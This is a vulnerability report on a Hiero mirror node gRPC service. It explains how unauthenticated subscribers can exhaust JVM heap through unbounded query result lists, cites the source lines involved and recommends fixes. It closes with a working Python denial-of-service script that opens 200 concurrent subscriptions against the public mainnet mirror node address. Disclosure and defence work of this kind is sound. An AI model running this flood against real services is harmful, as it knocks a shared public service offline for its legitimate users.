### Title
Unauthenticated gRPC Subscriber Heap Exhaustion via Unbounded In-Memory Result Materialization

### Summary
`TopicMessageRepositoryCustomImpl.findByFilter()` calls `getResultList()` which fully materializes up to 5,000 `TopicMessage` objects into a Java `List` on the heap before returning a `Stream`. Because the gRPC subscription endpoint requires no authentication and enforces no global subscriber count limit, an unprivileged attacker can open arbitrarily many concurrent connections — each triggering independent poll cycles — to exhaust JVM heap memory and cause a denial of service.

### Finding Description

**Exact code path:**

`TopicMessageRepositoryCustomImpl.findByFilter()` at line 60:
```java
return typedQuery.getResultList().stream(); // getResultStream()'s cursor doesn't work with reactive streams
``` [1](#0-0) 

This is called from `PollingTopicMessageRetriever.poll()`:
```java
return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
``` [2](#0-1) 

**Two distinct memory-loading paths exist:**

**Path 1 — Throttled (maxPageSize=1000, every 2s):** `TopicMessageServiceImpl.subscribeTopic()` calls `retrieve(filter, true)`: [3](#0-2) 

**Path 2 — Unthrottled (maxPageSize=5000, every 20ms, up to 12 polls):** `missingMessages()` calls `retrieve(gapFilter, false)` and `retrieve(newFilter, false)`: [4](#0-3) [5](#0-4) 

The unthrottled defaults are `maxPageSize=5000`, `pollingFrequency=20ms`, `maxPolls=12`: [6](#0-5) 

**Root cause:** `getResultList()` is a JPA method that fetches the entire result set into a `java.util.List<TopicMessage>` in heap memory before any element is consumed. The comment in the code explicitly acknowledges this is intentional (`getResultStream()`'s cursor doesn't work with reactive streams), but no compensating control (subscriber cap, per-IP limit, backpressure-aware cursor) was added.

**Why existing checks fail:**

- `maxConcurrentCallsPerConnection=5` limits calls *per connection*, but an attacker opens many connections: [7](#0-6) 

- `subscriberCount` is a Micrometer gauge for observability only — it is never checked against a maximum before accepting a new subscriber: [8](#0-7) 

- The only gRPC interceptor sets endpoint context for table-usage tracking; it performs no authentication or rate limiting: [9](#0-8) 

- `retrieverProperties.getTimeout()` (default 60s) bounds a single retrieval session but does not prevent many concurrent sessions from running simultaneously: [10](#0-9) 

### Impact Explanation

Each concurrent subscriber independently materializes up to 5,000 `TopicMessage` objects per poll cycle into heap. With N concurrent attackers, heap pressure scales linearly: N × 5,000 objects × ~1–2 KB per `TopicMessage` ≈ tens to hundreds of MB per poll wave. At sufficient concurrency this triggers aggressive GC, then OOM, crashing the JVM or making the service unresponsive for all legitimate subscribers. The gRPC service is a public-facing API endpoint with no authentication gate, making this a complete availability denial for all users of the mirror node's HCS subscription service.

### Likelihood Explanation

The attack requires only a standard gRPC client (e.g., `grpcurl`, the Hedera Java SDK, or any HTTP/2 client). No credentials, tokens, or privileged network position are needed. The attacker subscribes to any existing topic (or a topic that existed historically) with `startTime=0` to maximize rows returned per poll. Opening 50–200 concurrent connections from a single machine is trivial. The unthrottled path is triggered automatically by the safety-check mechanism after 1 second of no data, requiring no special timing from the attacker. This is fully repeatable and scriptable.

### Recommendation

1. **Replace `getResultList()` with a true server-side cursor/scroll**: Use `ScrollableResults` (Hibernate) or Spring Data's `Stream<T>` with `@QueryHints(HINT_FETCH_SIZE)` so rows are fetched incrementally and GC can reclaim processed objects before the next batch arrives.
2. **Enforce a global subscriber cap**: Check `subscriberCount` against a configurable maximum before accepting a new subscription and return `RESOURCE_EXHAUSTED` if exceeded.
3. **Add per-IP or per-connection subscription rate limiting** at the gRPC interceptor layer.
4. **Reduce unthrottled `maxPageSize`** or require the unthrottled path to be explicitly opted into by authenticated/trusted callers only.

### Proof of Concept

```python
# Requires: pip install grpcio grpcio-tools hedera-sdk or raw grpc stubs
# Assumes topic 0.0.1234 has >= 5000 historical messages

import grpc, threading
from proto import consensus_service_pb2_grpc, mirror_network_topology_pb2 as pb

TARGET = "mainnet-public.mirrornode.hedera.com:443"  # or self-hosted instance

def flood_subscribe():
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = pb.ConsensusTopicQuery(
        topicID=pb.TopicID(topicNum=1234),
        consensusStartTime=pb.Timestamp(seconds=0, nanos=0),  # startTime=0 → max rows
    )
    try:
        for _ in stub.subscribeTopic(req):
            pass  # consume slowly / not at all to keep session alive
    except Exception:
        pass

threads = [threading.Thread(target=flood_subscribe) for _ in range(200)]
for t in threads:
    t.start()
# 200 concurrent subscribers × 5000 TopicMessage objects × ~1.5 KB ≈ 1.5 GB heap pressure per poll wave
```

Each thread holds an open gRPC stream. The server materializes 5,000 `TopicMessage` objects per subscriber per poll cycle into heap. With 200 threads the JVM heap is exhausted within seconds to minutes depending on configured `-Xmx`.

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/repository/TopicMessageRepositoryCustomImpl.java (L60-60)
```java
        return typedQuery.getResultList().stream(); // getResultStream()'s cursor doesn't work with reactive streams
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L78-78)
```java
        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-55)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L63-63)
```java
        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L149-149)
```java
            return topicMessageRetriever.retrieve(gapFilter, false);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L177-177)
```java
        return topicMessageRetriever.retrieve(newFilter, false).concatWithValues(current);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/RetrieverProperties.java (L27-28)
```java
    @NotNull
    private Duration timeout = Duration.ofSeconds(60L);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/RetrieverProperties.java (L36-47)
```java
    public static class UnthrottledProperties {

        @Min(1000)
        private int maxPageSize = 5000;

        @Min(4)
        private long maxPolls = 12;

        @DurationMin(millis = 10)
        @NotNull
        private Duration pollingFrequency = Duration.ofMillis(20);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/test/java/org/hiero/mirror/grpc/interceptor/GrpcInterceptor.java (L13-22)
```java
public class GrpcInterceptor implements ServerInterceptor {

    @Override
    public <ReqT, RespT> ServerCall.Listener<ReqT> interceptCall(
            ServerCall<ReqT, RespT> call, Metadata headers, ServerCallHandler<ReqT, RespT> next) {
        final var fullMethod = call.getMethodDescriptor().getFullMethodName();
        final var methodName = fullMethod.substring(fullMethod.lastIndexOf('.') + 1);
        EndpointContext.setCurrentEndpoint(methodName);
        return next.startCall(call, headers);
    }
```
